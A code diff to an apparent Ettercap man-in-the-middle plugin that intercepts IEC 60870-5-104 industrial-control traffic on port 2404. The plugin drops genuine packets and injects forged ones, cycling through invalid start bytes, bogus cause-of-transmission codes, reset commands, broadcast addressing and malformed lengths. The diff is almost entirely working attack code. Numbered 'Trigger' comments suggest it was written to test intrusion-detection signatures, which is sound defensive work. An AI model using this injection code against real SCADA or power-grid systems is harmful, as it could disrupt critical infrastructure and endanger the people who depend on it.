@@ -38,10 +38,17 @@
 #define ADDR_TWO_OCTECTS 0;
 
 enum {I_FORMAT, S_FORMAT, U_FORMAT};
+enum {INVALID_START, SPON_COT, INVALID_COT, INVALID_COT_45, INVALID_COT_01, INVALID_COT_15, INVALID_COT_32, TYPE_ID_RESET, BROADCAST_ADDRESS, INVALID_LENGTH, TYPE_ID_INVALID_CONTROL_DIR, TYPE_ID_INVALID_MONITOR_DIR};
 
 u_char START        = 0x68;
+u_char RESET        = 0x69;
 u_char M_ME_TF_1    = 0x24;
 u_char M_SP_TB_1    = 0x1e;
+#ifdef ADDR_TWO_OCTECTS
+  short BROADCAST    = 0xFFFF;
+#else 
+  u_char BROADCAST   = 0xFF;
+#endif
 
 struct apci_header {
   u_char start;
@@ -76,6 +83,12 @@ struct asdu_header {
   u_char nt : 1;
   u_char iv : 1;
 };
+
+static const char *triggers[] = {
+"0 INVALID_START", "1 SPON_COT", "2 INVALID_COT", "3 INVALID_COT_45", "4 INVALID_COT_01", "5 INVALID_COT_15", "6 INVALID_COT_32", "7 TYPE_ID_RESET", "8 BROADCAST_ADDRESS", "9 INVALID_LENGTH", "10 TYPE_ID_INVALID_CONTROL_DIR", "11 TYPE_ID_INVALID_MONITOR_DIR"
+};
+
+int trigger = 0;
 
 /* prototypes is required for -Wmissing-prototypes */
 
@@ -173,46 +186,182 @@ static int spoof_104_fini(void *dummy)
 
 static void parse_tcp(struct packet_object *po)
 {
+
+  /* don't show packets while operating */
+  GBL_OPTIONS->quiet = 1;
+
   struct apci_header *apci;
   struct asdu_header *asdu;
   apci = (struct apci_header *)po->DATA.data;
   asdu = (struct asdu_header *)(apci + 1);
 
   /* We are interested in monitor packets of type M_SP_TB_1 */
-  if(START == apci->start && I_FORMAT == get_type(apci->control_1) && M_SP_TB_1 == asdu->type_id) {
+  // if(START == apci->start && I_FORMAT == get_type(apci->control_1) && M_SP_TB_1 == asdu->type_id) {
+  
+  /* Grab all 104 packets. */
+  if(START == apci->start) {
 
-    USER_MSG("=========================");
-    USER_MSG("\nOld Packet\n");
-    print_apci(apci);
-    print_asdu(asdu);
-    USER_MSG("=========================");
+    if (trigger >= 11) {
+      trigger = 0;
+    } else {
+      trigger++;
+    }
+
+    // USER_MSG("=========================");
+    // USER_MSG("\nOld Packet\n");
+    // print_apci(apci);
+    // print_asdu(asdu);
+    // USER_MSG("=========================");
 
     /* we can't inject in unoffensive mode or in bridge mode */
     if (GBL_OPTIONS->unoffensive || GBL_OPTIONS->read || GBL_OPTIONS->iface_bridge) {
-    // if ( GBL_OPTIONS->unoffensive) {
-      USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
+          USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
       return -EINVALID;
     } 
 
     /* Prevent the packet being sent */
     po->flags ^= PO_DROPPED;
-
-    /* Modify the value */
-    asdu->COT = 0x2A;
+    /* Set the SPI field to zero */
     // asdu->spi = 0;
-    memcpy(po->DATA.data, apci, sizeof(apci));
-    memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));
+
+    switch(trigger){
+      case INVALID_START:
+      /* Trigger 6666601 */
+      apci->start = 0x42;
+      USER_MSG("%s\n", triggers[INVALID_START]);
+      break;
+      case TYPE_ID_INVALID_CONTROL_DIR:
+      /* Trigger 6666611 - When a packet comes from the client. */
+      if (ntohs(po->L4.dst) == 2404) {
+        asdu->type_id = 0x1F;  /* 31 */
+      }
+      
+      USER_MSG("%s\n", triggers[TYPE_ID_INVALID_CONTROL_DIR]);
+
+      break;
+
+      case TYPE_ID_INVALID_MONITOR_DIR:
+      /* Trigger 6666612 */
+      if (ntohs(po->L4.dst) != 2404) {
+        asdu->type_id = 0x7E;  /* 126 */
+      }
+
+      USER_MSG("%s\n", triggers[TYPE_ID_INVALID_MONITOR_DIR]);
+
+      break;
+      case SPON_COT:
+      /* Trigger 6666602 */
+      asdu->COT = 0x03; /* Needs more packets to trigger */
+      USER_MSG("%s\n", triggers[SPON_COT]);
+
+      break;
+
+      case INVALID_COT:
+      /* Trigger 6666617 - Default to catch and from the client. */ 
+      asdu->COT = 0x2A;     /* Invalid */
+      USER_MSG("%s\n", triggers[INVALID_COT]);
+
+      break;
+      case INVALID_COT_45:
+      /* Trigger 6666618 */
+      asdu->type_id = 0x2D; /* 45 */
+      asdu->COT = 0x2A;     /* Invalid */
+      USER_MSG("%s\n", triggers[INVALID_COT_45]);
+
+      break;
+
+      case INVALID_COT_01:
+      /* Trigger 6666619 */
+      asdu->type_id = 0x01; /* 01 */
+      asdu->COT = 0x2A;     /* Invalid */
+      USER_MSG("%s\n", triggers[INVALID_COT_01]);
+
+      break;
+
+      case INVALID_COT_15:
+      /* Trigger 6666620 */
+      asdu->type_id = 0xF; /* 15 */
+      asdu->COT = 0x2A;     /* Invalid */
+      USER_MSG("%s\n", triggers[INVALID_COT_15]);
+
+      break;
+
+      case INVALID_COT_32:
+      /* Trigger 6666621 */
+      asdu->type_id = 0x20; /* 32 */
+      asdu->COT = 0x2A;     /* Invalid */
+      USER_MSG("%s\n", triggers[INVALID_COT_32]);
+
+      break;
+
+      case TYPE_ID_RESET:
+      /* Trigger 6666608 */
+      asdu->type_id = RESET; 
+      USER_MSG("%s\n", triggers[TYPE_ID_RESET]);
+
+      break;
+      case BROADCAST_ADDRESS:
+      /* Trigger 6666609 */
+      asdu->originator_addr = BROADCAST;
+      USER_MSG("%s\n", triggers[BROADCAST_ADDRESS]);
+
+      break;
+
+      case INVALID_LENGTH:
+      /*Trigger 6666613/15/16 - Causes the conenction the be reset WinPP's error. */
+      apci->length = 15;
+      USER_MSG("%s\n", triggers[INVALID_LENGTH]);
+
+      break;
+
+    }
+    /* PACKET SIZE TO LONG */
+
+    // USER_MSG("%d ->", po->DATA.disp_len);
+    // memcpy(po->DATA.data, apci, sizeof(apci));
+    // memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));
+    // memcpy(po->DATA.data + sizeof(struct apci_header) + sizeof(apci), "PETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETE", sizeof("PETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETEPETE"));
+    // po->DATA.disp_len = 512;
+    // USER_MSG("%d\n", po->DATA.disp_len);
+
+    /* PACKET SIZE TO LONG */
 
     /* DEBUG */
-    USER_MSG("=========================");
-    USER_MSG("\nNew Packet\n");
-    print_apci(apci);
-    print_asdu(asdu);
-    USER_MSG("=========================");
+    // USER_MSG("=========================");
+    // USER_MSG("\nNew Packet\n");
+    // print_apci(apci);
+    // print_asdu(asdu);
+    // USER_MSG("=========================");
+
+    /* Change the IP address */
+
+    // char ip_str = "10.50.50.5";
+    // struct in_addr ipaddr;
+    // struct ip_addr ip;
+
+    // if (inet_pton(AF_INET, &ip_str, &ipaddr) == 1) {
+    //   USER_MSG("[!!] Unable to parse new IP address.\n");
+    // }
+
+    // if (ip_addr_init(&ip, AF_INET, (u_char *)&ipaddr) == 1) {
+    //   USER_MSG("[!!] Unable to set new IP address.\n");
+    // }
+    // send_tcp(&ip, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
+
+    /* Change the IP address */
 
     /* Send modified packet */
+    // send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
+    // USER_MSG("\n%d -> %d <> ", ntohs(po->L4.dst), ntohs(po->L4.src));
+    // send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
+
+    // if (ntohs(po->L4.dst) == 2404) {
+    //   po->L4.dst = htons(1337);
+    // }
     send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
-    
+    // USER_MSG("%d -> %d\n", ntohs(po->L4.dst), ntohs(po->L4.src));
+    // sleep(100);
+
   }
 }
 
